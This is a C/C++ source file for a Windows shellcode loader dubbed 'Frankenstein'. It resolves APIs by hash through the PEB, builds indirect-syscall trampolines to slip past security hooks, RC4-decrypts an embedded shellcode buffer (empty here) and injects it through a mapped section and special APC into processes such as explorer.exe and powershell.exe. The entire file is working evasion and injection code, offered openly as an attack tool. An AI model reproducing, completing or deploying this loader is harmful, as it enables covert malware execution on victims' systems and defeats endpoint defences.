#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:WinMain /NODEFAULTLIB")
#pragma comment(lib,    "kernel32.lib")

#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>

typedef unsigned char           uint8_t;
typedef unsigned short          uint16_t;
typedef unsigned int            uint32_t;
typedef unsigned long long      uint64_t;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef LSA_UNICODE_STRING  UNICODE_STRING;
typedef LSA_UNICODE_STRING *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY         InLoadOrderLinks;
    LIST_ENTRY         InMemoryOrderLinks;
    LIST_ENTRY         InInitializationOrderLinks;
    PVOID              DllBase;
    PVOID              EntryPoint;
    ULONG              SizeOfImage;
    LSA_UNICODE_STRING FullDllName;
    LSA_UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE          Reserved1[2];
    BYTE          BeingDebugged;
    BYTE          Reserved2[1];
    PVOID         Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

static void my_zero(void* p, SIZE_T n) {
    __stosb((unsigned char*)p, 0, (unsigned long long)n);
}

static void* my_memcpy(void* dst, const void* src, SIZE_T n) {
    volatile char* d = (char*)dst;
    const volatile char* s = (const char*)src;
    while (n--) *d++ = *s++;
    return dst;
}

static bool my_wcsieq(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? *a + 32 : *a;
        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? *b + 32 : *b;
        if (ca != cb) return false;
        ++a; ++b;
    }
    return *a == *b;
}

static void RC4Decrypt(uint8_t* data, SIZE_T dataLen, const uint8_t* key, SIZE_T keyLen) {
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int i1 = 0, j1 = 0;
    for (SIZE_T i = 0; i < dataLen; i++) {
        i1 = (i1 + 1) % 256;
        j1 = (j1 + S[i1]) % 256;
        uint8_t t = S[i1]; S[i1] = S[j1]; S[j1] = t;
        data[i] ^= S[(S[i1] + S[j1]) % 256];
    }
}

constexpr uint32_t HASH_SEED = 5381;

constexpr uint32_t HashStringA(const char* s) {
    uint32_t h = HASH_SEED;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

static DWORD HashRuntime(const char* s) {
    DWORD h = HASH_SEED;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

static HMODULE GetKernel32Base() {
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        auto mod = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        wchar_t* n = mod->BaseDllName.Buffer;
        if (n &&
            (n[0]=='K'||n[0]=='k') && (n[1]=='E'||n[1]=='e') &&
            (n[2]=='R'||n[2]=='r') && (n[3]=='N'||n[3]=='n') &&
            (n[4]=='E'||n[4]=='e') && (n[5]=='L'||n[5]=='l') &&
            n[6]=='3' && n[7]=='2')
            return (HMODULE)mod->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

static HMODULE GetKernelBaseBase() {
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        auto mod = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        wchar_t* n = mod->BaseDllName.Buffer;
        if (n &&
            (n[0]=='K'||n[0]=='k') && (n[1]=='E'||n[1]=='e') &&
            (n[2]=='R'||n[2]=='r') && (n[3]=='N'||n[3]=='n') &&
            (n[4]=='E'||n[4]=='e') && (n[5]=='L'||n[5]=='l') &&
            (n[6]=='B'||n[6]=='b') && (n[7]=='A'||n[7]=='a') &&
            (n[8]=='S'||n[8]=='s') && (n[9]=='E'||n[9]=='e') &&
            n[10]==L'.')
            return (HMODULE)mod->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

static HMODULE GetNtdllBase() {
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        auto mod = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        wchar_t* n = mod->BaseDllName.Buffer;
        if (n &&
            (n[0]=='n'||n[0]=='N') && (n[1]=='t'||n[1]=='T') &&
            (n[2]=='d'||n[2]=='D') && (n[3]=='l'||n[3]=='L') &&
            (n[4]=='l'||n[4]=='L') && n[5]==L'.')
            return (HMODULE)mod->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

static PVOID GetProcByHash(PVOID base, uint32_t hash) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS)((uint8_t*)base + dos->e_lfanew);
    auto exp = (PIMAGE_EXPORT_DIRECTORY)((uint8_t*)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    auto names    = (uint32_t*)((uint8_t*)base + exp->AddressOfNames);
    auto ordinals = (uint16_t*)((uint8_t*)base + exp->AddressOfNameOrdinals);
    auto funcs    = (uint32_t*)((uint8_t*)base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((uint8_t*)base + names[i]);
        if (HashRuntime(name) == hash)
            return (PVOID)((uint8_t*)base + funcs[ordinals[i]]);
    }
    return nullptr;
}

typedef VOID(WINAPI* fnOutputDebugStringA)(LPCSTR);
typedef VOID(WINAPI* fnOutputDebugStringW)(LPCWSTR);

static fnOutputDebugStringA g_dbg  = nullptr;
static fnOutputDebugStringW g_dbgW = nullptr;
#define IDBG(s) if (g_dbg) g_dbg("[Frank][Inject] " s)

static void my_dword_to_hex(DWORD val, char* buf) {
    buf[0]='0'; buf[1]='x';
    for (int i = 9; i >= 2; i--) {
        int nibble = val & 0xF;
        buf[i] = (char)(nibble < 10 ? '0'+nibble : 'A'+(nibble-10));
        val >>= 4;
    }
    buf[10] = '\0';
}

static void my_dword_to_str(DWORD val, char* buf) {
    if (val == 0) { buf[0]='0'; buf[1]='\0'; return; }
    char tmp[12]; int i = 0;
    while (val) { tmp[i++] = (char)('0' + val % 10); val /= 10; }
    int j = 0;
    while (i > 0) buf[j++] = tmp[--i];
    buf[j] = '\0';
}

static char* my_strcat(char* dst, const char* src) {
    char* p = dst;
    while (*p) p++;
    while (*src) *p++ = *src++;
    *p = '\0';
    return dst;
}

typedef HANDLE(WINAPI* fnOpenMutexW)             (DWORD, BOOL, LPCWSTR);
typedef HANDLE(WINAPI* fnCreateMutexA)           (LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef BOOL  (WINAPI* fnCloseHandle)            (HANDLE);
typedef LPVOID(WINAPI* fnVirtualAlloc)           (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL  (WINAPI* fnVirtualFree)            (LPVOID, SIZE_T, DWORD);
typedef BOOL  (WINAPI* fnVirtualProtect)         (LPVOID, SIZE_T, DWORD, PDWORD);
typedef VOID  (WINAPI* fnSleep)                  (DWORD);
typedef VOID  (WINAPI* fnExitProcess)            (UINT);
typedef BOOL  (WINAPI* fnGetProcessMitigationPolicy)(HANDLE, int, PVOID, SIZE_T);

typedef struct {
    union {
        DWORD Flags;
        struct {
            DWORD ProhibitDynamicCode : 1;
            DWORD AllowThreadOptOut   : 1;
            DWORD AllowRemoteDowngrade: 1;
            DWORD ReservedFlags       : 29;
        };
    };
} FRANK_DYNAMIC_CODE_POLICY;
#define FRANK_ProcessDynamicCodePolicy 2

typedef struct {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} FRANK_OBJECT_ATTRIBUTES;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} FRANK_CLIENT_ID;

typedef struct {
    PVOID    ExitStatus;
    PVOID    PebBaseAddress;
    PVOID    AffinityMask;
    PVOID    BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} FRANK_PROCESS_BASIC_INFO;

typedef NTSTATUS(NTAPI* fnNtOpenProcess)(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    FRANK_OBJECT_ATTRIBUTES* ObjectAttributes, FRANK_CLIENT_ID* ClientId);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
    HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* fnNtGetNextProcess)(
    HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle);

typedef NTSTATUS(NTAPI* fnNtGetNextThread)(
    HANDLE ProcessHandle, HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess, ULONG HandleAttributes,
    ULONG Flags, PHANDLE NewThreadHandle);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle, DWORD ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
#define FRANK_ProcessBasicInformation  0
#define FRANK_ProcessImageFileName     27

typedef PVOID PPS_APC_ROUTINE;
typedef NTSTATUS(NTAPI* fnNtQueueApcThreadEx2)(
    HANDLE ThreadHandle, HANDLE ReserveHandle, ULONG ApcFlags,
    PPS_APC_ROUTINE ApcRoutine, PVOID Arg1, PVOID Arg2, PVOID Arg3);
#define FRANKENSTEIN_SPECIAL_APC 0x00000001UL

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize,
    ULONG InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

#define FRANK_ViewUnmap 2

struct FrankCtx {
    fnOpenMutexW                 pOpenMutexW;
    fnCloseHandle                pClose;
    fnVirtualFree                pVFree;
    fnGetProcessMitigationPolicy pGetMitigation;
    fnNtGetNextProcess           pNtGetNextProc;
    fnNtGetNextThread            pNtGetNextThread;
    fnNtQueryInformationProcess  pNtQIP;
    fnNtOpenProcess              pNtOpenProc;
    fnNtQueueApcThreadEx2        pNtQueueApc;
    fnNtCreateSection            pNtCreateSection;
    fnNtMapViewOfSection         pNtMapViewOfSection;
    fnNtUnmapViewOfSection       pNtUnmapViewOfSection;
};

static DWORD GetSyscallSSN(PVOID ntdl, uint32_t nameHash) {
    uint8_t* fn = (uint8_t*)GetProcByHash(ntdl, nameHash);
    if (!fn) return (DWORD)-1;

    if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
        return *(DWORD*)(fn + 4);
    if (fn[0] == 0xB8)
        return *(DWORD*)(fn + 1);

    for (int d = 1; d <= 32; d++) {
        uint8_t* up = fn + (SIZE_T)d * 32;
        if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8)
            return *(DWORD*)(up + 4) - (DWORD)d;
        uint8_t* dn = fn - (SIZE_T)d * 32;
        if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8)
            return *(DWORD*)(dn + 4) + (DWORD)d;
    }
    return (DWORD)-1;
}

static PVOID FindSyscallGadget(PVOID ntdl) {
    uint8_t* fn = (uint8_t*)GetProcByHash(ntdl, HashStringA("NtClose"));
    if (fn) {
        for (int i = 0; i < 40; i++)
            if (fn[i]==0x0F && fn[i+1]==0x05) return fn + i;
    }
    auto dos = (PIMAGE_DOS_HEADER)ntdl;
    auto nt  = (PIMAGE_NT_HEADERS)((uint8_t*)ntdl + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        uint8_t* base = (uint8_t*)ntdl + sec->VirtualAddress;
        SIZE_T   size = sec->Misc.VirtualSize;
        for (SIZE_T j = 0; j + 1 < size; j++)
            if (base[j]==0x0F && base[j+1]==0x05) return base + j;
    }
    return NULL;
}

static void WriteTrampolineAt(uint8_t* slot, DWORD ssn, PVOID gadget) {
    DWORD i = 0;
    slot[i++] = 0xB8;
    slot[i++] = (uint8_t)(ssn);
    slot[i++] = (uint8_t)(ssn >> 8);
    slot[i++] = (uint8_t)(ssn >> 16);
    slot[i++] = (uint8_t)(ssn >> 24);
    slot[i++] = 0x4C; slot[i++] = 0x8B; slot[i++] = 0xD1;
    slot[i++] = 0xFF; slot[i++] = 0x25;
    slot[i++] = 0x00; slot[i++] = 0x00; slot[i++] = 0x00; slot[i++] = 0x00;
    my_memcpy(slot + i, &gadget, 8);
}

static bool PathEndsWith(const uint8_t* qipBuf, ULONG retLen, const wchar_t* suffix) {
    if (retLen < sizeof(UNICODE_STRING)) return false;
    auto us = (UNICODE_STRING*)qipBuf;
    if (!us->Buffer || us->Length == 0) return false;
    int slen = 0;
    while (suffix[slen]) slen++;
    int ulen = us->Length / (int)sizeof(wchar_t);
    if (ulen < slen) return false;
    const wchar_t* end = us->Buffer + ulen - slen;
    for (int j = 0; j < slen; j++) {
        wchar_t a = end[j], b = suffix[j];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) return false;
    }
    return true;
}

static uint8_t* build_payload(
    const uint8_t* sc, SIZE_T sc_len,
    uint64_t create_mutex_addr, SIZE_T* out_len,
    fnVirtualAlloc pVA)
{
    const char   mtx_name[] = "Global\\PP_KB_MTX\0";
    const SIZE_T name_len   = 17;

    *out_len = 33 + name_len + sc_len;
    uint8_t* buf = (uint8_t*)pVA(NULL, *out_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return nullptr;

    SIZE_T o = 0;

    const uint8_t sub_rsp[] = { 0x48, 0x83, 0xEC, 0x28 };
    my_memcpy(buf + o, sub_rsp, 4); o += 4;

    buf[o++] = 0x31; buf[o++] = 0xC9;
    buf[o++] = 0x31; buf[o++] = 0xD2;

    const uint8_t lea_r8[] = { 0x4C, 0x8D, 0x05, 0x12, 0x00, 0x00, 0x00 };
    my_memcpy(buf + o, lea_r8, 7); o += 7;

    buf[o++] = 0x48; buf[o++] = 0xB8;
    my_memcpy(buf + o, &create_mutex_addr, 8); o += 8;

    buf[o++] = 0xFF; buf[o++] = 0xD0;

    const uint8_t add_rsp[] = { 0x48, 0x83, 0xC4, 0x28 };
    my_memcpy(buf + o, add_rsp, 4); o += 4;

    buf[o++] = 0xEB; buf[o++] = (uint8_t)name_len;

    my_memcpy(buf + o, mtx_name, name_len); o += name_len;
    my_memcpy(buf + o, sc, sc_len);

    return buf;
}

static BOOL FrankensteinInject(
    const uint8_t* payload, SIZE_T payloadSize,
    const FrankCtx& ctx)
{
    const wchar_t mtx[] = L"Global\\PP_KK_MTX";
    HANDLE hMtx = ctx.pOpenMutexW(MUTEX_ALL_ACCESS, FALSE, mtx);
    if (hMtx) { IDBG("already running"); ctx.pClose(hMtx); return FALSE; }

    DWORD selfPid = GetCurrentProcessId();

    HANDLE hSection = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)payloadSize;

    NTSTATUS stSec = ctx.pNtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL,
        &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(stSec) || !hSection) { IDBG("FAIL: NtCreateSection"); return FALSE; }

    PVOID  localView  = NULL;
    SIZE_T lViewSize  = 0;
    NTSTATUS stLM = ctx.pNtMapViewOfSection(
        hSection, (HANDLE)-1, &localView,
        0, 0, NULL, &lViewSize, FRANK_ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(stLM)) {
        IDBG("FAIL: NtMapViewOfSection(local)");
        ctx.pClose(hSection); return FALSE;
    }
    my_memcpy(localView, payload, payloadSize);
    ctx.pNtUnmapViewOfSection((HANDLE)-1, localView);

    static const wchar_t* s_targets[] = {
        L"\\explorer.exe",
        L"\\powershell.exe",
        L"\\notepad.exe",
        L"\\mspaint.exe",
        L"\\msbuild.exe",
        NULL
    };

    DWORD  targetPid  = 0;
    HANDLE hProc      = NULL;
    PVOID  remoteView = NULL;
    HANDLE hThread    = NULL;

    for (int ti = 0; !targetPid; ti++) {
        const wchar_t* suffix = s_targets[ti];

        HANDLE hCurr = NULL;
        for (;;) {
            HANDLE hNext = NULL;
            NTSTATUS ns = ctx.pNtGetNextProc(
                hCurr, PROCESS_QUERY_LIMITED_INFORMATION, 0, 0, &hNext);
            if (hCurr) ctx.pClose(hCurr);
            if (!NT_SUCCESS(ns)) break;
            hCurr = hNext;

            FRANK_PROCESS_BASIC_INFO pbi;
            my_zero(&pbi, sizeof(pbi));
            if (!NT_SUCCESS(ctx.pNtQIP(hCurr, FRANK_ProcessBasicInformation,
                &pbi, sizeof(pbi), NULL))) continue;
            DWORD pid = (DWORD)pbi.UniqueProcessId;
            if (pid == 0 || pid == 4 || pid == selfPid) continue;

            uint8_t imgBuf[600];
            my_zero(imgBuf, sizeof(imgBuf));
            ULONG retLen = 0;
            if (!NT_SUCCESS(ctx.pNtQIP(hCurr, FRANK_ProcessImageFileName,
                imgBuf, (ULONG)(sizeof(imgBuf) - sizeof(wchar_t)), &retLen))) continue;
            if (suffix != NULL && !PathEndsWith(imgBuf, retLen, suffix)) continue;

            if (ctx.pGetMitigation) {
                FRANK_DYNAMIC_CODE_POLICY dcp;
                my_zero(&dcp, sizeof(dcp));
                if (ctx.pGetMitigation(hCurr, FRANK_ProcessDynamicCodePolicy, &dcp, sizeof(dcp)))
                    if (dcp.ProhibitDynamicCode) continue;
            }

            FRANK_OBJECT_ATTRIBUTES oa; my_zero(&oa, sizeof(oa)); oa.Length = sizeof(oa);
            FRANK_CLIENT_ID cid; cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid; cid.UniqueThread = NULL;
            HANDLE hWrite = NULL;
            NTSTATUS stOP = ctx.pNtOpenProc(
                &hWrite, PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, &oa, &cid);
            if (!NT_SUCCESS(stOP) || !hWrite) continue;

            PVOID  rView     = NULL;
            SIZE_T rViewSize = 0;
            NTSTATUS stRM = ctx.pNtMapViewOfSection(
                hSection, hWrite, &rView,
                0, 0, NULL, &rViewSize, FRANK_ViewUnmap, 0, PAGE_EXECUTE_READ);
            if (!NT_SUCCESS(stRM)) { ctx.pClose(hWrite); continue; }

            HANDLE tNext = NULL;
            NTSTATUS stGT = ctx.pNtGetNextThread(hWrite, NULL, THREAD_SET_CONTEXT, 0, 0, &tNext);
            if (!tNext) {
                ctx.pNtUnmapViewOfSection(hWrite, rView);
                ctx.pClose(hWrite); continue;
            }

            targetPid  = pid;
            hProc      = hWrite;
            remoteView = rView;
            hThread    = tNext;
            ctx.pClose(hCurr);
            hCurr = NULL;
            break;
        }
        if (hCurr) ctx.pClose(hCurr);
        if (targetPid) break;
        if (suffix == NULL) break;
    }

    ctx.pClose(hSection);

    if (!targetPid || !hProc || !remoteView || !hThread) {
        IDBG("FAIL: no suitable target");
        if (hProc)   ctx.pClose(hProc);
        if (hThread) ctx.pClose(hThread);
        return FALSE;
    }

    NTSTATUS st = ctx.pNtQueueApc(
        hThread, NULL, FRANKENSTEIN_SPECIAL_APC,
        (PPS_APC_ROUTINE)remoteView, NULL, NULL, NULL);

    ctx.pClose(hThread);
    ctx.pClose(hProc);
    return NT_SUCCESS(st);
}

unsigned char rc4_key[] = {
    0xB6, 0x90, 0x0E, 0x25, 0xB0, 0xBF, 0x8E, 0x6D,
    0x7F, 0x22, 0xBF, 0x52, 0xD7, 0xF9, 0x3D, 0x43
};
SIZE_T rc4_key_len = sizeof(rc4_key);

unsigned char enc_shellcode[] = {
    // shellcode goes here (RC4-encrypted)
};
SIZE_T enc_shellcode_len = sizeof(enc_shellcode);

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    PVOID k32   = GetKernel32Base();
    PVOID kbase = GetKernelBaseBase();
    PVOID ntdl  = GetNtdllBase();
    if (!k32 || !kbase || !ntdl) return 1;

    auto pOpenMutexW    = (fnOpenMutexW)   GetProcByHash(kbase, HashStringA("OpenMutexW"));
    auto pCreateMutexA  = (fnCreateMutexA) GetProcByHash(kbase, HashStringA("CreateMutexA"));
    auto pClose         = (fnCloseHandle)  GetProcByHash(kbase, HashStringA("CloseHandle"));
    auto pVAlloc        = (fnVirtualAlloc) GetProcByHash(kbase, HashStringA("VirtualAlloc"));
    auto pVFree         = (fnVirtualFree)  GetProcByHash(kbase, HashStringA("VirtualFree"));
    auto pVProtect      = (fnVirtualProtect)GetProcByHash(kbase, HashStringA("VirtualProtect"));
    auto pGetMitigation = (fnGetProcessMitigationPolicy)GetProcByHash(kbase, HashStringA("GetProcessMitigationPolicy"));
    auto pSleep         = (fnSleep)        GetProcByHash(kbase, HashStringA("Sleep"));
    auto pExitProcess   = (fnExitProcess)  GetProcByHash(kbase, HashStringA("ExitProcess"));
    auto pDbgStr        = (fnOutputDebugStringA)GetProcByHash(kbase, HashStringA("OutputDebugStringA"));
    g_dbg  = pDbgStr;

#define DBG(s) if (pDbgStr) pDbgStr("[Frank] " s)

    do {
        if (!pOpenMutexW || !pCreateMutexA || !pClose ||
            !pVAlloc || !pVFree || !pVProtect || !pSleep) {
            DBG("FAIL: api resolve"); break;
        }

        PVOID gadget = FindSyscallGadget(ntdl);
        if (!gadget) { DBG("FAIL: no syscall gadget"); break; }

        auto pNtGetNextProc = (fnNtGetNextProcess)GetProcByHash(ntdl, HashStringA("NtGetNextProcess"));
        if (!pNtGetNextProc) { DBG("FAIL: NtGetNextProcess"); break; }

        DWORD ssnNtOpenProc   = GetSyscallSSN(ntdl, HashStringA("NtOpenProcess"));
        DWORD ssnNtGetNextTh  = GetSyscallSSN(ntdl, HashStringA("NtGetNextThread"));
        DWORD ssnNtGetNextPr  = GetSyscallSSN(ntdl, HashStringA("NtGetNextProcess"));
        DWORD ssnNtQIP        = GetSyscallSSN(ntdl, HashStringA("NtQueryInformationProcess"));
        DWORD ssnNtQueueApc   = GetSyscallSSN(ntdl, HashStringA("NtQueueApcThreadEx2"));
        DWORD ssnNtCreateSec  = GetSyscallSSN(ntdl, HashStringA("NtCreateSection"));
        DWORD ssnNtMapView    = GetSyscallSSN(ntdl, HashStringA("NtMapViewOfSection"));
        DWORD ssnNtUnmapView  = GetSyscallSSN(ntdl, HashStringA("NtUnmapViewOfSection"));

        if (ssnNtOpenProc==(DWORD)-1 || ssnNtGetNextTh==(DWORD)-1 ||
            ssnNtGetNextPr==(DWORD)-1 || ssnNtQIP==(DWORD)-1 ||
            ssnNtQueueApc==(DWORD)-1  || ssnNtCreateSec==(DWORD)-1 ||
            ssnNtMapView==(DWORD)-1   || ssnNtUnmapView==(DWORD)-1) {
            DBG("FAIL: SSN resolve"); break;
        }

        const int TRAMP_COUNT = 8;
        const int SLOT        = 32;
        uint8_t* tPage = (uint8_t*)pVAlloc(
            NULL, TRAMP_COUNT*SLOT, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!tPage) { DBG("FAIL: trampoline alloc"); break; }

        WriteTrampolineAt(tPage + 0*SLOT, ssnNtOpenProc,  gadget);
        WriteTrampolineAt(tPage + 1*SLOT, ssnNtGetNextTh, gadget);
        WriteTrampolineAt(tPage + 2*SLOT, ssnNtGetNextPr, gadget);
        WriteTrampolineAt(tPage + 3*SLOT, ssnNtQIP,       gadget);
        WriteTrampolineAt(tPage + 4*SLOT, ssnNtQueueApc,  gadget);
        WriteTrampolineAt(tPage + 5*SLOT, ssnNtCreateSec, gadget);
        WriteTrampolineAt(tPage + 6*SLOT, ssnNtMapView,   gadget);
        WriteTrampolineAt(tPage + 7*SLOT, ssnNtUnmapView, gadget);

        DWORD oldProt = 0;
        if (!pVProtect(tPage, TRAMP_COUNT*SLOT, PAGE_EXECUTE_READ, &oldProt)) {
            DBG("FAIL: trampoline VirtualProtect"); break;
        }

        auto tNtOpenProc  = (fnNtOpenProcess)           (tPage + 0*SLOT);
        auto tNtGetNextTh = (fnNtGetNextThread)          (tPage + 1*SLOT);
        auto tNtGetNextPr = (fnNtGetNextProcess)         (tPage + 2*SLOT);
        auto tNtQIP       = (fnNtQueryInformationProcess)(tPage + 3*SLOT);
        auto tNtQueueApc  = (fnNtQueueApcThreadEx2)      (tPage + 4*SLOT);
        auto tNtCreateSec = (fnNtCreateSection)          (tPage + 5*SLOT);
        auto tNtMapView   = (fnNtMapViewOfSection)       (tPage + 6*SLOT);
        auto tNtUnmapView = (fnNtUnmapViewOfSection)     (tPage + 7*SLOT);

        if (enc_shellcode_len == 0) { DBG("shellcode empty - PoC stub only"); break; }

        LPVOID localBuf = pVAlloc(NULL, enc_shellcode_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!localBuf) { DBG("FAIL: VirtualAlloc local"); break; }

        my_memcpy(localBuf, enc_shellcode, enc_shellcode_len);
        RC4Decrypt((uint8_t*)localBuf, enc_shellcode_len, rc4_key, rc4_key_len);

        SIZE_T   payloadLen = 0;
        uint8_t* payload = build_payload(
            (const uint8_t*)localBuf, enc_shellcode_len,
            (uint64_t)(ULONG_PTR)pCreateMutexA,
            &payloadLen, pVAlloc);
        pVFree(localBuf, 0, MEM_RELEASE);

        if (!payload) { DBG("FAIL: build_payload"); break; }

        FrankCtx ctx;
        my_zero(&ctx, sizeof(ctx));
        ctx.pOpenMutexW       = pOpenMutexW;
        ctx.pClose            = pClose;
        ctx.pVFree            = pVFree;
        ctx.pGetMitigation    = pGetMitigation;
        ctx.pNtGetNextProc    = tNtGetNextPr;
        ctx.pNtGetNextThread  = tNtGetNextTh;
        ctx.pNtQIP            = tNtQIP;
        ctx.pNtOpenProc       = tNtOpenProc;
        ctx.pNtQueueApc       = tNtQueueApc;
        ctx.pNtCreateSection  = tNtCreateSec;
        ctx.pNtMapViewOfSection   = tNtMapView;
        ctx.pNtUnmapViewOfSection = tNtUnmapView;

        BOOL ok = FrankensteinInject(payload, payloadLen, ctx);
        pVFree(payload, 0, MEM_RELEASE);

    } while (0);

    if (pSleep) pSleep(INFINITE);
    if (pExitProcess) pExitProcess(0);
    return 0;
}
